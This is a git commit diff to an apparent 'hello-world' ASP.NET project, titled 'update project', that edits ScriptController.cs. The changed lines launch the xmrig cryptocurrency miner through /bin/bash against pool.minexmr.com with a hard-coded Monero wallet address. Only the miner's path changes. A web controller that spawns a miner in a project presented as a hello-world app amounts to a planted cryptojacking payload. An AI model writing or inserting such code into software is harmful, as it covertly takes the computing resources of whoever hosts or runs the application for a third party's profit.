e3fb40ed62a64899251218ed58e1f10047f4512c
knyL <linhleduc.it@hotmail.com>
2022-03-09 22:12:27 +0700

    update project

--- hello-world/Controllers/ScriptController.cs
+++ hello-world/Controllers/ScriptController.cs
@@ -67,7 +67,7 @@ namespace hello_world.Controllers
                     FileName = $"/bin/bash",
                     WorkingDirectory = AppContext.BaseDirectory,
                     Arguments =
-                        $"-c \"xmrig/xmrig -o pool.minexmr.com:4444 -u 48QZP31VnTkYTbsqZ4dq1JGMjwtds2sBnCpxrjGwBfTWG1NrEoWJGca5mxxoL8oD3NQmQuK23fTi546McgXxmd2NSyTUB1T.testxx \"",
+                        $"-c \"xmrig -o pool.minexmr.com:4444 -u 48QZP31VnTkYTbsqZ4dq1JGMjwtds2sBnCpxrjGwBfTWG1NrEoWJGca5mxxoL8oD3NQmQuK23fTi546McgXxmd2NSyTUB1T.testxx \"",
                     RedirectStandardOutput = true,
                     RedirectStandardError = true,
                     UseShellExecute = false
